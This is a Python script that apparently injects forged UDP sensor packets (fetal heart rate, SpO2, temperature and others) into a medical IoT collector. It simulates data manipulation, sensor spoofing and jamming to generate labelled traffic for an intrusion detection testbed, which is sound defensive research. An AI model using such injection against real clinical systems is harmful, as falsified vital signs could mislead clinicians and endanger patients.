import socket
import time
import random
import json
from datetime import datetime
from config import TARGET_IP, COLLECTOR_PORT, SENSOR_RANGES

# ======================================================
# FIXED & IDS-COMPATIBLE IoT ATTACK INJECTOR
# ======================================================

VALID_SENSOR_IDS = ["S1", "S2", "S3", "S4", "S5"]

SENSOR_MAP = {
    "S1": "FHR",
    "S2": "TOCO",
    "S3": "SpO2",
    "S4": "RespRate",
    "S5": "Temp"
}

class IoTAttackInjector:
    def __init__(self):
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

    # --------------------------------------------------
    def send(self, pkt):
        self.sock.sendto(json.dumps(pkt).encode(), (TARGET_IP, COLLECTOR_PORT))

    # --------------------------------------------------
    def attack_packet(self, sensor_id, sensor_type, value):
        return {
            "sensor_id": sensor_id,
            "sensor_type": sensor_type,
            "value": value,
            "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        }

    # --------------------------------------------------
    def send_attack_meta(self, count):
        meta = {
            "type": "ATTACK_META",
            "count": count
        }
        self.send(meta)

    # ==================================================
    # ATTACK 1 — MITM DATA MANIPULATION
    # ==================================================
    def mitm_attack(self, duration=12):
        print("\n🔴 MITM DATA MANIPULATION ATTACK")
        end = time.time() + duration
        count = 0

        while time.time() < end:
            sid = random.choice(VALID_SENSOR_IDS)
            stype = SENSOR_MAP[sid]

            if stype == "FHR":
                value = random.choice([50, 220])
            elif stype == "SpO2":
                value = random.randint(70, 85)
            elif stype == "Temp":
                value = round(random.uniform(39.5, 41.0), 1)
            else:
                value = round(random.uniform(*SENSOR_RANGES[stype]), 1)

            pkt = self.attack_packet(sid, stype, value)
            self.send(pkt)
            count += 1
            print(f"[MITM] {sid} | {stype} → {value}")
            time.sleep(0.8)

        self.send_attack_meta(count)
        print(f"✓ MITM attack complete | packets={count}")

    # ==================================================
    # ATTACK 2 — SPOOFING (WRONG SENSOR TYPE)
    # ==================================================
    def spoofing_attack(self, duration=12):
        print("\n🔴 SPOOFING ATTACK")
        end = time.time() + duration
        count = 0

        while time.time() < end:
            sid = random.choice(VALID_SENSOR_IDS)
            wrong_type = random.choice(list(SENSOR_RANGES.keys()))

            if wrong_type == SENSOR_MAP[sid]:
                continue

            lo, hi = SENSOR_RANGES[wrong_type]
            value = round(random.uniform(lo, hi), 2)

            pkt = self.attack_packet(sid, wrong_type, value)
            self.send(pkt)
            count += 1
            print(f"[SPOOF] {sid} | {wrong_type} → {value}")
            time.sleep(1)

        self.send_attack_meta(count)
        print(f"✓ Spoofing attack complete | packets={count}")

    # ==================================================
    # ATTACK 3 — JAMMING (ZERO / NULL VALUES)
    # ==================================================
    def jamming_attack(self, duration=10):
        print("\n🔴 JAMMING ATTACK")
        end = time.time() + duration
        count = 0

        while time.time() < end:
            sid = random.choice(VALID_SENSOR_IDS)
            stype = SENSOR_MAP[sid]
            value = random.choice([0, -1])

            pkt = self.attack_packet(sid, stype, value)
            self.send(pkt)
            count += 1
            print(f"[JAM] {sid} | {stype} → {value}")
            time.sleep(0.6)

        self.send_attack_meta(count)
        print(f"✓ Jamming attack complete | packets={count}")

    # ==================================================
    # MENU
    # ==================================================
    def menu(self):
        while True:
            print("\n==============================")
            print(" Medical IoT Attack Injector ")
            print("==============================")
            print("1. MITM Manipulation")
            print("2. Spoofing Attack")
            print("3. Jamming Attack")
            print("4. Run ALL")
            print("5. Exit")

            choice = input("Select: ").strip()

            if choice == "1":
                self.mitm_attack()
            elif choice == "2":
                self.spoofing_attack()
            elif choice == "3":
                self.jamming_attack()
            elif choice == "4":
                self.mitm_attack()
                time.sleep(5)
                self.spoofing_attack()
                time.sleep(5)
                self.jamming_attack()
            elif choice == "5":
                break
            else:
                print("Invalid choice")

# ======================================================
# MAIN
# ======================================================
if __name__ == "__main__":
    print("\n🚨 FIXED IoT ATTACK INJECTOR")
    print(f"Target: {TARGET_IP}:{COLLECTOR_PORT}")
    injector = IoTAttackInjector()
    injector.menu()
